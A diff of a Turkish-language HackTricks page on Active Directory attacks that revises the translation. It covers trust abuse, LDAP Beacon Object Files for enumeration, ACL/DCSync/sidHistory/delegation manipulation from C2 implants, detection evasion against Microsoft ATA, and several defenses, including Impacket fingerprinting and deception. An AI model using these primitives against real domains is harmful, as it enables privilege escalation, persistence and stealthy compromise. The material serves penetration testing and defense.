+Trusted alanı ele geçirmenin başka bir yolu, domain trust’ın **ters yönünde** oluşturulmuş bir [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) bulmaktır (bu çok yaygın değildir).
 
-Trusted domain’i ele geçirmenin başka bir yolu da, **trusted domain’den bir user’ın erişebileceği** bir makinede **RDP** ile login olmayı beklemektir. Sonra attacker, RDP session process içine code enjekte edebilir ve oradan **victim’in origin domain’ine** erişebilir.\
-Ayrıca, eğer **victim hard drive’ını mount ettiyse**, **RDP session** process’inden attacker hard drive’ın **startup folder**’ına **backdoor** saklayabilir. Bu technique’e **RDPInception** denir.
+Trusted alanı ele geçirmenin başka bir yolu da, **trusted domain** içinden bir **kullanıcının erişebildiği** bir makinede **RDP** ile oturum açılmasını beklemektir. Sonra saldırgan, RDP session process içine code enjekte edebilir ve oradan kurbanın **origin domain**’ine erişebilir.\
+Ayrıca, eğer **kurban hard drive**’ını bağladıysa, **RDP session** process’inden saldırgan hard drive’ın **startup folder**’ına **backdoor** yerleştirebilir. Bu tekniğe **RDPInception** denir.
 
 
 {{#ref}}
@@ -877,26 +915,26 @@ rdp-sessions-abuse.md
 
 ### **SID Filtering:**
 
-- Forest trust’lar across SID history attribute’u kullanarak yapılan saldırıların riski, varsayılan olarak tüm inter-forest trust’larda etkin olan SID Filtering ile azaltılır. Bu, Microsoft’un yaklaşımına göre security boundary olarak domain yerine forest’ı dikkate alan ve intra-forest trust’ların secure olduğu varsayımına dayanır.
-- Ancak bir nokta var: SID filtering applications ve user access’i bozabilir, bu da bazen devre dışı bırakılmasına yol açar.
+- SID history attribute üzerinden forest trust’lar arasında yapılan saldırı riski, varsayılan olarak tüm inter-forest trust’larda etkin olan SID Filtering ile azaltılır. Bu, Microsoft’un yaklaşımına göre güvenlik sınırı olarak domain yerine forest’ı dikkate alarak intra-forest trust’ların güvenli olduğu varsayımına dayanır.
+- Ancak bir nokta var: SID filtering uygulamaları ve kullanıcı erişimini bozabilir; bu yüzden zaman zaman devre dışı bırakılabilir.
 
 ### **Selective Authentication:**
 
-- Inter-forest trust’lar için Selective Authentication kullanmak, iki forest’tan gelen users’ın otomatik olarak authenticated edilmemesini sağlar. Bunun yerine, users’ın trusting domain veya forest içindeki domains ve servers’a erişmesi için explicit permissions gerekir.
-- Bu önlemlerin writable Configuration Naming Context (NC) exploit edilmesine veya trust account’a yönelik saldırılara karşı koruma sağlamadığını unutmamak önemlidir.
+- Inter-forest trust’lar için Selective Authentication kullanmak, iki forest’taki kullanıcıların otomatik olarak authenticate edilmemesini sağlar. Bunun yerine, kullanıcıların trusting domain veya forest içindeki domain’lere ve server’lara erişmesi için açık izinler gerekir.
+- Bu önlemlerin, writable Configuration Naming Context (NC) istismarı veya trust account’a yönelik saldırılara karşı koruma sağlamadığını belirtmek önemlidir.
 
-[**Domain trusts hakkında daha fazla bilgi ired.team’de.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
+[**Domain trust’ları hakkında daha fazla bilgi ired.team üzerinde.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
 
-## LDAP-based AD Abuse from On-Host Implants
+## On-Host Implant’lardan LDAP tabanlı AD Abuse
 
-[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection), bloodyAD-style LDAP primitives’ı tamamen on-host implant içinde çalışan x64 Beacon Object Files olarak yeniden uygular (ör. Adaptix C2). Operators paketi `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` ile derler, `ldap.axs` yükler ve ardından beacon’dan `ldap <subcommand>` çağırır. Tüm traffic mevcut logon security context üzerinden LDAP (389) ile signing/sealing ya da LDAPS (636) ile auto certificate trust kullanarak taşınır, bu yüzden socks proxy’ler veya disk artifact’leri gerekmez.
+[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection), bloodyAD tarzı LDAP primitive’lerini, tamamen on-host implant içinde çalışan x64 Beacon Object Files olarak yeniden uygular (ör. Adaptix C2). Operatörler paketi `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` ile derler, `ldap.axs` yükler ve ardından beacon’dan `ldap <subcommand>` çağırır. Tüm trafik, mevcut logon security context üzerinden LDAP (389) ile signing/sealing ya da auto certificate trust ile LDAPS (636) üzerinden gider; bu yüzden socks proxy’lere veya disk artifact’larına gerek yoktur.
 
-### Implant-side LDAP enumeration
+### Implant tarafında LDAP enumeration
 
-- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, ve `get-groupmembers` kısa isimleri/OU path’lerini tam DN’lere çözer ve ilgili object’leri döker.
-- `get-object`, `get-attribute`, ve `get-domaininfo` keyfi attribute’ları (security descriptor’lar dahil) ve `rootDSE` içindeki forest/domain metadata’sını çeker.
-- `get-uac`, `get-spn`, `get-delegation`, ve `get-rbcd` roasting adaylarını, delegation ayarlarını ve mevcut [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptor’larını doğrudan LDAP’den gösterir.
-- `get-acl` ve `get-writable --detailed`, DACL’i ayrıştırarak trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) ve inheritance bilgilerini listeler; böylece ACL privilege escalation için anında hedefler sağlar.
+- `get-users`, `get-computers`, `get-groups`, `get-usergroups` ve `get-groupmembers`, kısa adları/OU yollarını tam DN’lere çözer ve ilgili objeleri döker.
+- `get-object`, `get-attribute` ve `get-domaininfo`, rootDSE’den forest/domain metadata’sı ile birlikte keyfi attribute’ları (security descriptor’lar dahil) çeker.
+- `get-uac`, `get-spn`, `get-delegation` ve `get-rbcd`, roasting adaylarını, delegation ayarlarını ve mevcut [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptor’larını doğrudan LDAP’dan açığa çıkarır.
+- `get-acl` ve `get-writable --detailed`, trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) ve inheritance’ı listelemek için DACL’yi ayrıştırır; böylece ACL privilege escalation için anında hedefler sağlar.
 ```powershell
 ldap get-users --ldaps
 ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
@@ -905,19 +943,19 @@ ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
 ```
 ### Yükseltme ve kalıcılık için LDAP write primitives
 
-- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) operatörün, OU rights mevcut olan her yerde yeni principal’lar veya machine account’lar hazırlamasına izin verir. `add-groupmember`, `set-password`, `add-attribute`, ve `set-attribute`, write-property rights bulunduğunda hedefleri doğrudan ele geçirir.
-- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, ve `add-dcsync` gibi ACL odaklı komutlar, herhangi bir AD object üzerindeki WriteDACL/WriteOwner yetkisini parola sıfırlama, group membership kontrolü veya DCSync replication privilege’larına çevirir; bunu yaparken PowerShell/ADSI artifact’ları bırakmaz. `remove-*` karşılıkları enjekte edilen ACE’leri temizler.
+- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`), operator’e OU rights bulunan her yerde yeni principals veya machine accounts hazırlama imkanı verir. `add-groupmember`, `set-password`, `add-attribute`, ve `set-attribute`, write-property rights bulunduğunda target’ları doğrudan ele geçirir.
+- ACL odaklı commands olan `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, ve `add-dcsync`, herhangi bir AD object üzerindeki WriteDACL/WriteOwner yetkilerini password reset, group membership control veya DCSync replication privileges’a dönüştürür; bunu yaparken PowerShell/ADSI artifacts bırakmaz. `remove-*` karşılıkları enjekte edilmiş ACE’leri temizler.
 
-### Delegation, roasting, ve Kerberos abuse
+### Delegation, roasting ve Kerberos abuse
 
-- `add-spn`/`set-spn`, ele geçirilmiş bir user’ı anında Kerberoastable yapar; `add-asreproastable` (UAC toggle) ise password’a dokunmadan onu AS-REP roasting için işaretler.
-- Delegation makroları (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) `msDS-AllowedToDelegateTo`, UAC flags, veya `msDS-AllowedToActOnBehalfOfOtherIdentity` alanlarını beacon üzerinden yeniden yazar; böylece constrained/unconstrained/RBCD attack path’leri etkinleşir ve remote PowerShell veya RSAT ihtiyacı ortadan kalkar.
+- `add-spn`/`set-spn`, ele geçirilmiş bir user’ı anında Kerberoastable hale getirir; `add-asreproastable` (UAC toggle) password’a dokunmadan onu AS-REP roasting için işaretler.
+- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`), beacon üzerinden `msDS-AllowedToDelegateTo`, UAC flags veya `msDS-AllowedToActOnBehalfOfOtherIdentity` alanlarını yeniden yazar; böylece constrained/unconstrained/RBCD saldırı yollarını açar ve remote PowerShell veya RSAT ihtiyacını ortadan kaldırır.
 
-### sidHistory injection, OU relocation, ve attack surface shaping
+### sidHistory injection, OU relocation ve attack surface şekillendirme
 
-- `add-sidhistory`, kontrollü bir principal’ın SID history’sine ayrıcalıklı SID’ler enjekte eder ([SID-History Injection](sid-history-injection.md) bölümüne bakın), tamamen LDAP/LDAPS üzerinden gizli access inheritance sağlar.
-- `move-object`, computer veya user’ların DN/OU bilgisini değiştirir; bu da saldırgana, delegated rights zaten mevcut olan OU’ların içine asset’leri taşıma ve ardından `set-password`, `add-groupmember`, veya `add-spn` kullanma imkânı verir.
-- Dar kapsamlı removal komutları (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, vb.), operatör credential’ları veya persistence topladıktan sonra hızlı rollback yapılmasına izin verir ve telemetry’yi minimize eder.
+- `add-sidhistory`, controlled principal’ın SID history’sine privileged SID’ler enjekte eder ([SID-History Injection](sid-history-injection.md) bölümüne bakın) ve tamamen LDAP/LDAPS üzerinden gizli access inheritance sağlar.
+- `move-object`, computers veya users’ın DN/OU bilgisini değiştirir; böylece attacker, varlıkları delegatated rights’ın zaten bulunduğu OUs içine taşıyabilir ve ardından `set-password`, `add-groupmember`, veya `add-spn` abuse edebilir.
+- Sıkı kapsamlı removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, vb.), operator credentials veya persistence topladıktan sonra hızlı rollback yapılmasını sağlar ve telemetry’yi minimize eder.
 
 ## AD -> Azure & Azure -> AD
 
@@ -926,62 +964,62 @@ ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
 https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
 {{#endref}}
 
-## Some General Defenses
+## Bazı Genel Savunmalar
 
-[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)
+[**Credentials’ı nasıl koruyacağınız hakkında daha fazla bilgi edinin.**](../stealing-credentials/credentials-protections.md)
 
-### **Credential Koruması için Savunma Önlemleri**
+### **Credentials Protection için Defensive Measures**
 
-- **Domain Admins Restrictions**: Domain Admins’in yalnızca Domain Controllers üzerinde login olmasına izin verilmesi, diğer host’larda kullanılmalarından kaçınılması tavsiye edilir.
+- **Domain Admins Restrictions**: Domain Admins’in yalnızca Domain Controllers’a login olmasına izin verilmesi, diğer host’larda kullanımından kaçınılması önerilir.
 - **Service Account Privileges**: Güvenliği korumak için services, Domain Admin (DA) privileges ile çalıştırılmamalıdır.
-- **Temporal Privilege Limitation**: DA privileges gerektiren görevler için süre kısıtlanmalıdır. Bu şu şekilde yapılabilir: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
-- **LDAP relay mitigation**: Event ID’ler 2889/3074/3075’i audit edin ve ardından LDAP MITM/relay girişimlerini engellemek için DC’lerde/clients’larda LDAP signing ile LDAPS channel binding uygulayın.
+- **Temporal Privilege Limitation**: DA privileges gerektiren task’lar için süreleri sınırlandırılmalıdır. Bu şu şekilde yapılabilir: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
+- **LDAP relay mitigation**: Event ID 2889/3074/3075’i audit edin ve ardından LDAP MITM/relay girişimlerini engellemek için DC’lerde/clients üzerinde LDAP signing ile LDAPS channel binding zorunlu hale getirin.
 
 {{#ref}}
 ldap-signing-and-channel-binding.md
 {{#endref}}
 
-### Protocol-level fingerprinting of Impacket activity
+### Impacket activity’si için protocol-level fingerprinting
 
-AD tradecraft’in yaygın kullanımını tespit etmek istiyorsanız, **yalnızca operator-controlled artifact’lara** güvenmeyin; örneğin yeniden adlandırılmış binaries, service names, temp batch files veya output paths. Meşru Windows client’ların [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, ve WMI trafiğini nasıl oluşturduğunu temel alın ve ardından, operatör `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, veya `ntlmrelayx.py` dosyalarını düzenledikten sonra bile kalan **implementation quirks** işaretlerini arayın.
+Sık kullanılan AD tradecraft’ı tespit etmek istiyorsanız, **yalnızca** yeniden adlandırılmış binaries, service names, temp batch files veya output paths gibi operator-controlled artifacts’a güvenmeyin. Meşru Windows clients’ın [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC ve WMI traffic’ini nasıl oluşturduğuna dair baseline çıkarın; ardından operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` veya `ntlmrelayx.py` üzerinde değişiklik yapmış olsa bile kalan **implementation quirks**’leri arayın.
 
-- **High-confidence standalone candidates** (kendi baseline’ınızla doğruladıktan sonra):
-- `auth_context_id = 79231 + ctx_id` kullanarak authenticated DCE/RPC
+- **Yüksek güvenilirlikte bağımsız adaylar** (kendi baseline’ınızla doğruladıktan sonra):
+- `auth_context_id = 79231 + ctx_id` kullanan authenticated DCE/RPC
 - `0xff` ile doldurulmuş DCE/RPC authentication padding
-- Raw Kerberos `AP-REQ` değerini doğrudan SPNEGO `mechToken` içine koyan LDAP Kerberos bind’leri
-- ASCII benzeri `ClientGuid` değerlerine sahip SMB2/3 negotiate request’leri
-- Standart dışı `//./root/cimv2` namespace’ini kullanan WMI `IWbemLevel1Login::NTLMLogin`
-- Hardcoded Kerberos nonce değerleri
-- **Correlation/scoring feature’ları için daha iyi**:
+- Raw Kerberos `AP-REQ`’yi doğrudan SPNEGO `mechToken` içine koyan LDAP Kerberos binds
+- ASCII benzeri görünen `ClientGuid` değerlerine sahip SMB2/3 negotiate requests
+- Standart dışı `//./root/cimv2` namespace’i kullanan WMI `IWbemLevel1Login::NTLMLogin`
+- Hardcoded Kerberos nonce values
+- **Correlation/scoring features olarak daha iyi**:
 - Seyrek veya kopyalanmış Kerberos etype listeleri, alışılmadık/eksik `PA-DATA`, ya da native Windows’tan farklı TGS-REQ etype sıralaması
-- Version info içermeyen NTLM Type 1 message’ları veya null host name’li Type 3 message’ları
-- SPNEGO yerine DCE/RPC içinde taşınan raw NTLMSSP, eksik DCE/RPC verification trailer’ları veya SPNEGO/Kerberos OID uyumsuzlukları
-- Aynı host/user/session/time window’dan gelen bu özelliklerden birkaçının birlikte görülmesi, tek bir zayıf field’dan çok daha güçlüdür
-- **Standalone alert yerine enrichment olarak kullanın**:
-- Default filenames, output paths, random service names, temporary batch names, default computer account names, ve tool-specific HTTP/WebDAV/RDP/MSSQL strings
-- Bunlar operatör tarafından kolayca değiştirilebilir; cross-protocol cluster’ın neden şüpheli olduğunu açıklamak için en iyi şekilde kullanılır
+- Version info’su olmayan NTLM Type 1 mesajları veya null host names içeren Type 3 mesajları
+- SPNEGO yerine DCE/RPC içinde taşınan raw NTLMSSP, eksik DCE/RPC verification trailers veya SPNEGO/Kerberos OID uyumsuzlukları
+- Aynı host/user/session/time window’dan gelen bu trait’lerden birkaçının birlikte görülmesi, tek bir zayıf field’dan çok daha güçlüdür
+- **Enrichment olarak kullanın, standalone alert olarak değil**:
+- Default filenames, output paths, random service names, temporary batch names, default computer account names ve tool-specific HTTP/WebDAV/RDP/MSSQL strings
+- Bunlar operator tarafından kolayca değiştirilebilir; cross-protocol cluster’ın neden şüpheli olduğunu açıklamak için en iyi şekilde kullanılır
 - **Operational notes**:
-- Bu sinyallerin bazıları decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, veya service-side visibility gerektirir
-- Alert’e dönüştürmeden önce Samba/Linux clients, appliances, ve legacy software ile doğrulayın
-- Confidence arttıkça detections’ı enrichment -> hunting -> alerting şeklinde ilerletin
+- Bu sinyallerin bazıları decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW veya service-side visibility gerektirir
+- Alert’e yükseltmeden önce Samba/Linux clients, appliances ve legacy software ile doğrulayın
+- Güven arttıkça detections’ı enrichment -> hunting -> alerting olarak ilerletin
 
-### **Deception Tekniklerini Uygulama**
+### **Deception Techniques Implementing**
 
-- Deception uygulamak, expire olmayan veya Trusted for Delegation olarak işaretlenmiş password’lar gibi özelliklere sahip, sahte kullanıcılar veya bilgisayarlar şeklinde tuzaklar kurmayı içerir. Ayrıntılı yaklaşım, belirli rights’lara sahip kullanıcılar oluşturmayı veya onları yüksek ayrıcalıklı gruplara eklemeyi kapsar.
-- Pratik bir örnek olarak şu tool’lar kullanılabilir: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
-- Deception tekniklerinin dağıtımı hakkında daha fazlası için [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) sayfasına bakın.
+- Deception uygulamak; decoy users veya computers gibi tuzaklar kurmayı, password’un expire olmaması ya da Trusted for Delegation olarak işaretlenmesi gibi özellikleri içermeyi kapsar. Detaylı yaklaşım, belirli rights’lara sahip users oluşturmayı veya onları yüksek ayrıcalıklı gruplara eklemeyi içerir.
+- Pratik bir örnek şu araçları kullanır: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
+- Deception techniques dağıtımı hakkında daha fazla bilgiye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) üzerinden ulaşılabilir.
 
-### **Deception’ı Tespit Etme**
+### **Deception’ı Belirleme**
 
-- **User Object’leri İçin**: Şüpheli göstergeler arasında atipik ObjectSID, seyrek logon’lar, creation date’ler, ve düşük bad password count’ları bulunur.
-- **Genel Göstergeler**: Potansiyel decoy object’lerin attribute’larını gerçek object’lerle karşılaştırmak tutarsızlıkları ortaya çıkarabilir. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) gibi tool’lar bu deception’ları belirlemede yardımcı olabilir.
+- **User Objects için**: Şüpheli göstergeler arasında atypical ObjectSID, nadir logon’lar, creation dates ve düşük bad password sayıları bulunur.
+- **Genel Göstergeler**: Potansiyel decoy objects’in attributes’larını gerçek olanlarla karşılaştırmak tutarsızlıkları ortaya çıkarabilir. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) gibi tools bu tür deception’ları belirlemede yardımcı olabilir.
 
-### **Detection Sistemlerini Atlatma**
+### **Detection Systems’i Bypass Etme**
 
 - **Microsoft ATA Detection Bypass**:
 - **User Enumeration**: ATA detection’ını önlemek için Domain Controllers üzerinde session enumeration yapmaktan kaçının.
-- **Ticket Impersonation**: Ticket oluştururken **aes** keys kullanmak, NTLM’e downgrade yapmadığı için detection’dan kaçınmaya yardımcı olur.
-- **DCSync Attacks**: ATA detection’ını önlemek için bir Domain Controller olmayan bir sistemden çalıştırmak önerilir; doğrudan Domain Controller’dan çalıştırma alert tetikler.
+- **Ticket Impersonation**: Ticket oluştururken **aes** keys kullanmak, NTLM’e downgrade etmeyerek detection’dan kaçınmaya yardımcı olur.
+- **DCSync Attacks**: ATA detection’ından kaçınmak için Domain Controller olmayan bir yerden çalıştırmak önerilir; çünkü doğrudan Domain Controller’dan çalıştırma alert tetikler.
 
 ## References
 
@@ -993,5 +1031,7 @@ AD tradecraft’in yaygın kullanımını tespit etmek istiyorsanız, **yalnızc
 - [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
 - [Hashcat](https://github.com/hashcat/hashcat)
 - [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
+- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
+- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
 
 {{#include ../../banners/hacktricks-training.md}}
